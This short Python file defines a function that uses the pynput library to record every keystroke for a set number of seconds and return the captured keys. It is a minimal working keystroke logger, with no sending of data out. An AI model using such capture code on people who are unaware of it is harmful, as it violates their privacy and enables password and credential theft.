from pynput.keyboard import Key, Listener
from time import sleep

def init(wait=30):

    keys = []

    def on_press(key):

        try:

            keys.append(key.char)

        except:

            keys.append('[{}]'.format(key.name))

    thread = Listener(on_press=on_press)
    thread.start()

    sleep(wait)

    return(keys)
